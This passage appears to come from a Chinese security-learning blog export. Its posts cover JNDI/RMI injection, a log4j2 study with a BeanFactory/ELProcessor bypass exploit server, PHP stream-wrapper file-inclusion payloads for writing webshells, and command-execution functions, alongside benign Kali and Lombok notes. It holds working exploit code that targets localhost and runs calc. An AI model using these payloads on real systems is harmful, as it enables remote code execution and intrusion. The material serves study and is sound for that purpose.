<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>server.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//第一个参数随便填</span></span><br><span class="line">        Reference reference=<span class="keyword">new</span> Reference(<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:5555/&quot;</span>);</span><br><span class="line">        <span class="comment">//这里末尾要加个/,否则无法读取.....</span></span><br><span class="line">        <span class="comment">//将该reference封装成远程对象</span></span><br><span class="line">        ReferenceWrapper referenceWrapper=<span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;hello&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>client.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url=<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>;</span><br><span class="line">        Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后本质上是通过URLClassLoader去远程加载了恶意类</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jndi</tag>
      </tags>
  </entry>
  <entry>
    <title>kali更新</title>
    <url>/2021/01/13/kali%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<p>kali更新依次使用即可更新前先更换源/etc/apt/sources.list</p>
<ul>
<li>中科大</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<ul>
<li>阿里云</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<ul>
<li>清华大学</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>

<p>apt-get update &amp; apt-get upgrade当出现正在读取软件包列表 . . .完成 ，画面长时间未变动时，回车执行下一条语句（若如正常执行完毕更好）</p>
<p>apt-get dist-upgrade在执行即将结束时会有一次选择，选择是否选择安装新的还是维持旧的，输入Y，安装新的。结束后安装完毕，可再一次执行第一条命令，检查是否所有的安装包是否全部安装。</p>
<p>apt-get clean此时已经全部安装完毕，执行下面的命令(可复制)可查看新系统版本<br>查看系统版本 命令：lsb_release -a</p>
<p>查看内核版本 命令：uname -r</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>kail</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j2漏洞学习记录</title>
    <url>/2022/09/23/log4j2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="lo4gj2漏洞简单学习记录"><a href="#lo4gj2漏洞简单学习记录" class="headerlink" title="lo4gj2漏洞简单学习记录"></a>lo4gj2漏洞简单学习记录</h1><p>log4j2和log4j简单的小区别</p>
<blockquote>
<ul>
<li><p>Log4j2分为2个jar包，一个是接口 log4j-api-版 本 号 . j a r   ， 一 个 是 具 体 实 现   l o g 4 j − c o r e − {版本号}.jar ，一个是具体实现 log4j-core-版本号.jar ，一个是具体实现 log4j−core−{版本号}.jar 。Log4j只有一个jar包 log4j-${版本号}.jar 。</p>
</li>
<li><p>Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。</p>
</li>
<li><p>Log4j2的package名称前缀为 org.<a href="https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020">apache</a>.logging.log4j 。Log4j的package名称前缀为 org.apache.log4j 。</p>
</li>
</ul>
</blockquote>
<h2 id="jdk低版本"><a href="#jdk低版本" class="headerlink" title="jdk低版本"></a>jdk低版本</h2><p>在低版本jdk中,可以通过ldap和rmi服务构造远程恶意类来让其执行恶意代码</p>
<p>1、首先攻击者遭到存在风险的接口（接口会将前端输入直接通过日志打印出来），然后向该接口发送攻击内容：${jndi:ldap://localhost:9999/Test}。</p>
<p>2、被攻击服务器接收到该内容后，通过Logj42工具将其作为日志打印。</p>
<p>源码：org.apache.logging.slf4j.Log4jLogger.debug(…)/info(…)/error(…)等方法</p>
<pre><code>        &gt; org.apache.logging.log4j.core.config.LoggerConfig.log(...)

              &gt; AbstractOutputStreamAppender.append(final LogEvent event)
</code></pre>
<p>3、此时Log4j2会解析${}，读取出其中的内容。判断其为Ldap实现的JNDI。于是调用Java底层的Lookup方法，尝试完成Ldap的Lookup操作。</p>
<p>源码：StrSubstitutor.substitute(…) –解析出${}中的内容：jndi:ldap://localhost:9999/Test</p>
<pre><code>            &gt; StrSubstitutor.resolveVariable(...) --处理解析出的内容，执行lookup

            &gt; Interpolator.lookup(...) --根据jndi找到jndi的处理类

                    &gt; JndiLookup.lookup(...)

                    &gt; JndiManager.lookup(...)

                            &gt; java.naming.InitialContext.lookup(...) --调用Java底层的Lookup方法
</code></pre>
<p>后面调用的就是<code>InitialContext.lookup方法</code>从而执行了恶意代码</p>
<h5 id="低版本攻击原理"><a href="#低版本攻击原理" class="headerlink" title="低版本攻击原理"></a>低版本攻击原理</h5><p>通过上面低版本的原理分析可知，我们根据在Ldap构造了javaFactoryLocation指向Codebase，告诉客户端需要从远端Codebase去获取需要的javaFactory类。获取到之后，然后使其使用本地的类加载器加载远程恶意的javaFactory类的，然后其在加载的过程中执行恶意的static代码块，从而实现攻击。</p>
<h3 id="jdk对于lookup方法的修复"><a href="#jdk对于lookup方法的修复" class="headerlink" title="jdk对于lookup方法的修复"></a>jdk对于lookup方法的修复</h3><p>RMI的JNDI注入在<code>8u121</code>后限制,需要手动开启<code>com.sun.jndi.rmi.object.trustURLCodebase</code>属性</p>
<p>RMI的JNDI注入在<code>8u191</code>后限制,需要手动开启<code>com.sun.jndi.rmi.object.trustURLCodebase</code>属性</p>
<h4 id="限制版本绕过"><a href="#限制版本绕过" class="headerlink" title="限制版本绕过"></a>限制版本绕过</h4><p>RMI的限制是限制了远程的工厂类而不限制本地,所以用本地工厂类触发</p>
<p>通过<code>org.apache.naming.factory.BeanFactory</code>结合<code>ELProcessor</code>绕过</p>
<p>LDAP的限制中不对<code>javaSerializedData</code>验证,所以可以打本地<code>gadget</code></p>
<h3 id="具体代码执行的地方"><a href="#具体代码执行的地方" class="headerlink" title="具体代码执行的地方"></a>具体代码执行的地方</h3><p>在<code>NamingManager.getObjectFactoryFromReference()</code>方法中,如果在默认的classpath加载不到该类</p>
<p>就会请求reference中的codebase得到class内容并使用类加载器加载,之后通过默认构造函数构造对象</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922165932132.png" alt="image-20220922165932132"></p>
<h4 id="什么是codebase"><a href="#什么是codebase" class="headerlink" title="什么是codebase"></a>什么是codebase</h4><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
<h3 id="高版本为何无效"><a href="#高版本为何无效" class="headerlink" title="高版本为何无效"></a>高版本为何无效</h3><p>上述所有操作都必须在JDK8u191之前才可以实现</p>
<p>在<code>VersionHelper12.loadClass</code>中加了一个对于trustURLCodebase的判断来控制是否允许请求codebase下载对应的class文件,其默认为false</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922172036555.png" alt="image-20220922172036555"></p>
<p>可以手动开启trustURLCodebase</p>
<p><code>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</code>将其指定为true，</p>
<h2 id="jdk高版本"><a href="#jdk高版本" class="headerlink" title="jdk高版本"></a>jdk高版本</h2><h3 id="lookup基本功能"><a href="#lookup基本功能" class="headerlink" title="lookup基本功能"></a>lookup基本功能</h3><p>当java底层请求ldap服务之后,ldap主要返回了三个参数javaClassName,javaFactory,javaFactoryLocation,以及一些额外参数,客户端获得这些参数之后主要做一件事情:构造需要的类实例,即客户端通过javaFactory类来构建实现我们需要的javaClassName执行的实例,这个过程中需要注意一下几点</p>
<ul>
<li><p>javaFactory类是ObjectFactory的子类</p>
</li>
<li><p>javaFactory有两个来源:来自codebase(ldap返回的codebase地址),或者来自本地(ldap返回对应javaFactory的类地址)</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922174055442.png" alt="image-20220922174055442"></p>
<ul>
<li><p>​    对于来自codeabse的Factory:和低版本中的逻辑一样,我们需要请求Codebase获取其class文件,然后加载该Factory类,并使用默认构造函数实例化出Factory实例</p>
</li>
<li><p>来自本地的Factory:直接根据ldap返回的路径(类限定符),通过Class.forName进行加载和实例化</p>
</li>
</ul>
</li>
<li><p>得到javaFactory实例后,我们需要构建通过javaFactory实例构建出JavaClassName指定的对象</p>
</li>
<li><p>log4j2通过javaFactory得到对应的对象之后,会调用其toString方法将其转换为字符串,然后用该字符串替换日志中的${…}内容,并且打印出来</p>
</li>
</ul>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922180330569.png" alt="image-20220922180330569"></p>
<h3 id="高版本如何利用ldap实现攻击"><a href="#高版本如何利用ldap实现攻击" class="headerlink" title="高版本如何利用ldap实现攻击"></a>高版本如何利用ldap实现攻击</h3><p>我们知道高版本已经无法通过codebase获取javaFactory的class文件,所以我们想通过让客户端加载和实例化我们构建的javaFactory来实现攻击是不可能的了</p>
<p>但是还可以通过ldap实例化本地的javaFactory,并且用本地的javaFactory实例化一个本地存在的类所以现在的问题就是如何找到一个可以被利用的本地javaFactory类</p>
<blockquote>
<p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
</blockquote>
<p>参考文章中提到了tomcat携带的org.apache.naming.factory.BeanFactory类就是一个存在风险的ObjectFactory子类。通过该Factory我们可以通过默认构造函数实例化任意一个类，并调用其任意的只有一个String入参的公共方法，且其方法名可以不用是标准setter的名称，而可以是任意名称。因为我们可以通过forceString来制定某个String变量的setter方法名称。</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923135856558.png" alt="image-20220923135856558"></p>
<p>在红框中会强制替换setterName和对应的param名称</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923140033950.png" alt="image-20220923140033950"></p>
<p>之后将param和param对应的setter方法放到map  <code>forced</code>中</p>
<p>并在接下来的代码中进行调用</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923140150754.png" alt="image-20220923140150754"></p>
<p>基于此能力,我们就可利用<code>javax.el.ELProcessor</code>类,因为其有默认公开的无参构造方法,还有个eval方法,只有一个String入参,其可以执行EL表达式,从而执行任意指令</p>
<blockquote>
<p> 这里埋个伏笔,完事可以尝试使用codeql来查询是否存在这样的类</p>
</blockquote>
<p>evilServer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServerNew</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 1097&quot;</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        </span><br><span class="line"> <span class="comment">//这里el表达式是通过&quot;&quot;空字符串.getClass</span></span><br><span class="line"> </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后执行的el表达式长这样</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923191015111.png" alt="image-20220923191015111"></p>
<p>通过””的string类型获取到String的class,所有class都继承于Class类,隐含这forName这个加载方法加载类</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923191700911.png" alt="image-20220923191700911"></p>
<p>client</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url=<span class="string">&quot;rmi://127.0.0.1:1097/Object&quot;</span>;</span><br><span class="line">        Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>log4j2</tag>
      </tags>
  </entry>
  <entry>
    <title>lombok小工具</title>
    <url>/2022/02/01/lombok%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>使用这款小工具可以通过添加注解来实现类的构造方法,set,get方法,让代码更简洁</p>
<h3 id="导入maven依赖"><a href="#导入maven依赖" class="headerlink" title="导入maven依赖"></a>导入maven依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span>     <span class="comment">//添加get,set方法</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span><span class="comment">//无参构造</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span><span class="comment">//全参构造</span></span><br></pre></td></tr></table></figure>

<h3 id="安装lombok插件"><a href="#安装lombok插件" class="headerlink" title="安装lombok插件"></a>安装lombok插件</h3><p>IDEAsetting里面一直无法下载插件</p>
<p>IDEA官网下载链接,下载后直接安装就行</p>
<p><a href="https://plugins.jetbrains.com/plugin/6317-lombok">https://plugins.jetbrains.com/plugin/6317-lombok</a></p>
<p>idea2020.1.1版本的</p>
<p><a href="https://plugins.jetbrains.com/files/6317/100775/lombok-plugin-0.33-2020.1.zip?updateId=100775&amp;pluginId=6317&amp;family=INTELLIJ">https://plugins.jetbrains.com/files/6317/100775/lombok-plugin-0.33-2020.1.zip?updateId=100775&amp;pluginId=6317&amp;family=INTELLIJ</a></p>
<h3 id="开启AnnocationProcessors"><a href="#开启AnnocationProcessors" class="headerlink" title="开启AnnocationProcessors"></a>开启AnnocationProcessors</h3><p>点击File– Settings设置界面，开启 AnnocationProcessors：</p>
<p>按下alt+7即可看到已经生成了对应的构造器和get,set方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220201204237651.png" alt="image-20220201204237651"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>lombok</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2022/01/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p>PHP带有很多内置URL风格的封装协议,可用于fopen,copy,file_exists和filesize等文件系统函数.除了这些内置封装协议,还能通过stream_wrapper_register注册自定义的封装协议,这些协议都被称为伪协议<span id="more"></span></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220121184629529.png" alt="image-20220121184629529"></p>
<p>常见的php伪协议如下:</p>
<ul>
<li><strong>php:// 访问各个输入输出流</strong></li>
<li>file://  访问本地文件系统</li>
<li>http://访问HTTP(S)网址</li>
<li>tfp://访问FTP(S)URLzlib://处理压缩流</li>
<li>data://读取数据</li>
<li>glob://查找匹配的文件路径模式</li>
<li>phar:// PHP归档</li>
<li>ssh2:// Secure Shell2</li>
<li>rar:// RAR数据压缩</li>
<li>ogg:// 处理音频流</li>
<li>expect:// 处理交互式的流</li>
</ul>
<h3 id="1-php-伪协议"><a href="#1-php-伪协议" class="headerlink" title="1.php://伪协议"></a>1.php://伪协议</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><h5 id="参数列表"><a href="#参数列表" class="headerlink" title="参数列表"></a>参数列表</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220121183621592.png" alt="image-20220121183621592"></p>
<p>示例代码:</p>
<p><code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code>  </p>
<p>或者</p>
<p><code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code></p>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>php://input可以访问请求的原始数据的只读流,即可以直接读取POST上没有经过解析的原始数据,<label style="background:yellow">但是使用entype=”multipart/form-data”(form表单的一个可选参数)的时候php://input是无效的</label></p>
<p><em><strong>php://input有以下三种用法</strong></em></p>
<h5 id="1-读取POST数据"><a href="#1-读取POST数据" class="headerlink" title="1)读取POST数据"></a>1)读取POST数据</h5><p>php://input可以直接读取POST上没有经过解析的原始数据利用php://input读取POST数据时,PHP配置文件不需要开启<code>allow_url_fopen</code>和<code>allow_url_include</code>示例代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-写入木马"><a href="#2-写入木马" class="headerlink" title="2)写入木马"></a>2)写入木马</h5><p><label style="background:yellow">利用php://input写入木马时,PHP配置文件需要开启allow_url_include,不需要开启allow_url_fopen</label></p>
<p>如果不开启allow_url_include则会报错</p>
<p>如果POST传入的数据时PHP代码,就可以写入木马</p>
<p>示例代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220121184145894.png" alt="image-20220121184145894"></p>
<p>访问shell.php即可查看是否写入成功</p>
<h5 id="3-执行命令"><a href="#3-执行命令" class="headerlink" title="3)执行命令"></a>3)执行命令</h5><p><label style="background:yellow">利用php://input执行命令时,PHP配置文件需开启allow_url_include,不需要开启allow_url_fopen</label></p>
<p>如果post传入的数据是PHP代码,就可以执行任意代码,如果次PHP代码调用了系统函数,就可以执行命令</p>
<p>示例代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220121184329051.png" alt="image-20220121184329051"></p>
<h3 id="2-file-伪协议"><a href="#2-file-伪协议" class="headerlink" title="2.file://伪协议"></a>2.file://伪协议</h3><p>file://伪协议可以访问<code>本地文件系统</code>,读取文件的内容</p>
<p>利用file://时,PHP配置文件不需要开启allow_url_fopen和allow_url_include</p>
<p><code>?filename=file://c:/boot.ini</code></p>
<p>file://伪协议示例代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-data-伪协议"><a href="#3-data-伪协议" class="headerlink" title="3.data://伪协议"></a>3.data://伪协议</h3><p>自PHP5.2.0起,数据流封装器开始有效,主要用于数据流的读取,如果传入的数据是php代码,就会执行任意代码使用方法如下:</p>
<p>data://text/plain;base64,xxxxxxxxx(base64编码后的数据)</p>
<p>利用data://时,PHP配置文件需开启allow_url_include和allow_url_fopen</p>
<p>data://伪协议示例代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过data://伪协议传送<code>&lt;?php phpinfo();?&gt;</code>代码的base64编码,这样就可以执行代码</p>
<p><code>?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p>
<p>注意点:要对<code>+</code>进行手动url编码为%2b<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/Image(17).png" alt="img"></p>
<h3 id="4-phar-伪协议"><a href="#4-phar-伪协议" class="headerlink" title="4.phar://伪协议"></a>4.phar://伪协议</h3><p>phar://是用来进行解压的伪协议,phar://参数中的文件不管是什么扩展名都会被当作压缩包</p>
<p>用法如下:</p>
<p>?file=phar://压缩包/内部文件</p>
<p><code>phar://xxx.png/shell.php</code></p>
<p>利用phar://时,PHP的版本应高于5.3.0,PHP配置文件需开启<code>allow_url_include</code>和<code>allow_url_fopen</code></p>
<p>注意:压缩包需要使用zip://伪协议压缩,而不能用rar://伪协议压缩.将木马文件压缩后,改为其他任意格式的文件都可以正常使用</p>
<p>示例代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用步骤:通常phar://伪协议用在有上传功能的网站中,写一个木马文件shell.php,然后用zip://伪协议压缩为shell.zip,</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220121183215673.png" alt="image-20220121183215673"></p>
<p>phar://伪协议把shell.png当做zip文件解压并访问其中的shell.php文件,执行了shell.php文件中的代码</p>
<p>再将扩展名改为.png等,上传到网站</p>
<h3 id="5-zip-伪协议"><a href="#5-zip-伪协议" class="headerlink" title="5.zip://伪协议"></a>5.zip://伪协议</h3><p>zip://伪协议和phar://伪协议在原理上类似,但是用法不一样</p>
<p>用法如下:(在浏览器中#要手动转换成url编码%23)</p>
<p><code>?filename=zip://xxx.png#shell.php</code></p>
<p>示例代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220121184409047.png" alt="image-20220121184409047"></p>
<h3 id="6-expect-伪协议"><a href="#6-expect-伪协议" class="headerlink" title="6.expect://伪协议"></a>6.expect://伪协议</h3><p>expect://伪协议主要用来执行系统命令,但是需要安装扩展</p>
<p>用法如下:</p>
<p><code>?filename=expect://ls</code></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>文件包含</tag>
        <tag>php伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>php命令执行小总结</title>
    <url>/2022/01/08/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="PHP常见的命令执行函数和运算符"><a href="#PHP常见的命令执行函数和运算符" class="headerlink" title="PHP常见的命令执行函数和运算符"></a>PHP常见的命令执行函数和运算符<span id="more"></span></h3><h5 id="1-system-函数"><a href="#1-system-函数" class="headerlink" title="1.system()函数"></a>1.system()函数</h5><p>用于执行外部程序,并且显示输出</p>
<p>system(‘whoami’)</p>
<p>root</p>
<h5 id="2-exec函数"><a href="#2-exec函数" class="headerlink" title="2.exec函数"></a>2.exec函数</h5><p>用于执行一个外部程序, 并不会自动输出,需要加echo</p>
<p>echo exec(‘whoami’)</p>
<p>root</p>
